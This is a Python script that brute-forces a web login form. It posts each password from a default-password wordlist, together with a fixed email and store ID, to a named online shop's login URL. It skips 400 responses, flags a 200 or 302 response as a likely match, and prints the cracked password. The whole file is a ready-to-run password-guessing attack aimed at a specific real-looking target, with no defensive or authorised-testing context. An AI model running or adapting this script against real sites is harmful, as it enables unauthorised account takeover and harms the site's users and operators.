import requests
import json
import sys

# Configuration
TARGET_URL = "https://www.pourvous.nl/login"  # REPLACE WITH YOUR TARGET URL
EMAIL = "test@gmail.com"
STORE_ID = 108
WORDLIST_FILE = "default-passwords.txt"
HEADERS = {"Content-Type": "application/json"}

def load_wordlist(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist file '{filepath}' not found.")
        sys.exit(1)

def main():
    passwords = load_wordlist(WORDLIST_FILE)
    print(f"Loaded {len(passwords)} passwords. Starting attack on {TARGET_URL}...")

    for password in passwords:
        payload = {
            "email": EMAIL,
            "password": password,
            "storeId": STORE_ID
        }
        
        try:
            response = requests.post(TARGET_URL, json=payload, headers=HEADERS, timeout=5)
            
            # Hide 400 Bad Request (similar to wfuzz -hc 400)
            if response.status_code == 400:
                continue
            
            # Check for potential success (200 OK, 302 Redirect, or specific 401/403 logic)
            if response.status_code in [200, 302]:
                # Optional: Check response body for specific success messages
                # if "success" in response.text.lower(): 
                print(f"\n[+] Potential Match Found!")
                print(f"Password: {password}")
                print(f"Status Code: {response.status_code}")
                print(f"Response: {response.text[:200]}") # Print first 200 chars
                break # Stop after first match
            
            # Optional: Print other status codes for debugging (e.g., 401 Unauthorized)
            # print(f"[-] {password} (Status: {response.status_code})")

        except requests.exceptions.RequestException as e:
            print(f"Error connecting: {e}")
            sys.exit(1)

if __name__ == "__main__":
    main()   